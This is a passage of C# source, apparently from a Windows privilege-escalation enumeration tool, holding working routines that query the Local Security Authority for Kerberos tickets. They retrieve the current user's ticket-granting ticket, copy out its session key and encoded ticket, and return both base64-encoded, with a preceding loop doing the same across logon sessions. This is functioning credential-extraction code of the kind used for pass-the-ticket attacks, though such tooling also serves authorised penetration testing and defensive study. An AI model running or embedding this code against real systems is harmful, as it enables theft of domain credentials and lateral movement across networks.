                                { "SessionKeyType", String.Format("{0}", sessionKeyType) },
                                { "Base64SessionKey", base64SessionKey },
                                { "KeyExpirationTime", String.Format("{0}", keyExpirationTime) },
                                { "TicketFlags", ticketFlags },
                                { "StartTime", String.Format("{0}", startTime) },
                                { "EndTime", String.Format("{0}", endTime) },
                                { "RenewUntil", String.Format("{0}", renewUntil) },
                                { "TimeSkew", String.Format("{0}", timeSkew) },
                                { "EncodedTicketSize", String.Format("{0}", encodedTicketSize) },
                                { "Base64EncodedTicket", base64TGT },
                            });
                            totalTicketCount++;
                        }
                    }
                    luidPtr = (IntPtr)((long)luidPtr.ToInt64() + Marshal.SizeOf(typeof(LUID)));
                    //move the pointer forward
                    LsaFreeReturnBuffer(sessionData);
                    //free the SECURITY_LOGON_SESSION_DATA memory in the struct
                }
                LsaFreeReturnBuffer(luidPtr);       //free the array of LUIDs

                // disconnect from LSA
                LsaDeregisterLogonProcess(hLsa);
            }
            catch (Exception ex)
            {
                Beaprint.GrayPrint(String.Format("  [X] Exception: {0}", ex.Message));
            }
            return results;
        }
        public static List<Dictionary<string, string>> ListKerberosTGTDataCurrentUser()
        {
            List<Dictionary<string, string>> results = new List<Dictionary<string, string>>();
            // adapted partially from Vincent LE TOUX' work
            //      https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2939-L2950
            // and https://www.dreamincode.net/forums/topic/135033-increment-memory-pointer-issue/
            // also Jared Atkinson's work at https://github.com/Invoke-IR/ACE/blob/master/ACE-Management/PS-ACE/Scripts/ACE_Get-KerberosTicketCache.ps1

            try
            {
                string name = "kerberos";
                LSA_STRING_IN LSAString;
                LSAString.Length = (ushort)name.Length;
                LSAString.MaximumLength = (ushort)(name.Length + 1);
                LSAString.Buffer = name;

                IntPtr responsePointer = IntPtr.Zero;
                int authPack;
                int returnBufferLength = 0;
                int protocalStatus = 0;
                IntPtr lsaHandle;
                int retCode;

                // If we want to look at tickets from a session other than our own
                // then we need to use LsaRegisterLogonProcess instead of LsaConnectUntrusted
                retCode = LsaConnectUntrusted(out lsaHandle);

                KERB_RETRIEVE_TKT_REQUEST tQuery = new KERB_RETRIEVE_TKT_REQUEST();
                KERB_RETRIEVE_TKT_RESPONSE response = new KERB_RETRIEVE_TKT_RESPONSE();

                // obtains the unique identifier for the kerberos authentication package.
                retCode = LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out authPack);

                // input object for querying the TGT (https://docs.microsoft.com/en-us/windows/desktop/api/ntsecapi/ns-ntsecapi-_kerb_retrieve_tkt_request)
                tQuery.LogonId = new LUID();
                tQuery.MessageType = KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveTicketMessage;
                // indicate we want kerb creds yo'
                //tQuery.CacheOptions = KERB_CACHE_OPTIONS.KERB_RETRIEVE_TICKET_AS_KERB_CRED;

                // query LSA, specifying we want the the TGT data
                retCode = LsaCallAuthenticationPackage_KERB_RETRIEVE_TKT(lsaHandle, authPack, ref tQuery, Marshal.SizeOf(tQuery), out responsePointer, out returnBufferLength, out protocalStatus);

                // parse the returned pointer into our initial KERB_RETRIEVE_TKT_RESPONSE structure
                response = (KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure((System.IntPtr)responsePointer, typeof(KERB_RETRIEVE_TKT_RESPONSE));

                KERB_EXTERNAL_NAME serviceNameStruct = (KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.ServiceName, typeof(KERB_EXTERNAL_NAME));
                string serviceName = Marshal.PtrToStringUni(serviceNameStruct.Names.Buffer, serviceNameStruct.Names.Length / 2).Trim();

                string targetName = "";
                if (response.Ticket.TargetName != IntPtr.Zero)
                {
                    KERB_EXTERNAL_NAME targetNameStruct = (KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.TargetName, typeof(KERB_EXTERNAL_NAME));
                    targetName = Marshal.PtrToStringUni(targetNameStruct.Names.Buffer, targetNameStruct.Names.Length / 2).Trim();
                }

                KERB_EXTERNAL_NAME clientNameStruct = (KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.ClientName, typeof(KERB_EXTERNAL_NAME));
                string clientName = Marshal.PtrToStringUni(clientNameStruct.Names.Buffer, clientNameStruct.Names.Length / 2).Trim();

                string domainName = Marshal.PtrToStringUni(response.Ticket.DomainName.Buffer, response.Ticket.DomainName.Length / 2).Trim();
                string targetDomainName = Marshal.PtrToStringUni(response.Ticket.TargetDomainName.Buffer, response.Ticket.TargetDomainName.Length / 2).Trim();
                string altTargetDomainName = Marshal.PtrToStringUni(response.Ticket.AltTargetDomainName.Buffer, response.Ticket.AltTargetDomainName.Length / 2).Trim();

                // extract the session key
                KERB_ENCRYPTION_TYPE sessionKeyType = (KERB_ENCRYPTION_TYPE)response.Ticket.SessionKey.KeyType;
                Int32 sessionKeyLength = response.Ticket.SessionKey.Length;
                byte[] sessionKey = new byte[sessionKeyLength];
                Marshal.Copy(response.Ticket.SessionKey.Value, sessionKey, 0, sessionKeyLength);
                string base64SessionKey = Convert.ToBase64String(sessionKey);

                DateTime keyExpirationTime = DateTime.FromFileTime(response.Ticket.KeyExpirationTime);
                DateTime startTime = DateTime.FromFileTime(response.Ticket.StartTime);
                DateTime endTime = DateTime.FromFileTime(response.Ticket.EndTime);
                DateTime renewUntil = DateTime.FromFileTime(response.Ticket.RenewUntil);
                Int64 timeSkew = response.Ticket.TimeSkew;
                Int32 encodedTicketSize = response.Ticket.EncodedTicketSize;

                string ticketFlags = ((KERB_TICKET_FLAGS)response.Ticket.TicketFlags).ToString();

                // extract the TGT and base64 encode it
                byte[] encodedTicket = new byte[encodedTicketSize];
                Marshal.Copy(response.Ticket.EncodedTicket, encodedTicket, 0, encodedTicketSize);
                string base64TGT = Convert.ToBase64String(encodedTicket);

                results.Add(new Dictionary<string, string>()
                {
                    { "ServiceName", serviceName },
                    { "TargetName", targetName },
                    { "ClientName", clientName },
                    { "DomainName", domainName },
                    { "TargetDomainName", targetDomainName },
                    { "SessionKeyType", String.Format("{0}", sessionKeyType) },
                    { "Base64SessionKey", base64SessionKey },
                    { "KeyExpirationTime", String.Format("{0}", keyExpirationTime) },
                    { "TicketFlags", ticketFlags },
                    { "StartTime", String.Format("{0}", startTime) },
                    { "EndTime", String.Format("{0}", endTime) },
                    { "RenewUntil", String.Format("{0}", renewUntil) },
                    { "TimeSkew", String.Format("{0}", timeSkew) },
                    { "EncodedTicketSize", String.Format("{0}", encodedTicketSize) },
                    { "Base64EncodedTicket", base64TGT },
                });

                // disconnect from LSA
                LsaDeregisterLogonProcess(lsaHandle);
            }
            catch (Exception ex)
            {
                Beaprint.GrayPrint(String.Format("  [X] Exception: {0}", ex.Message));
            }
            return results;
        }
    }
}
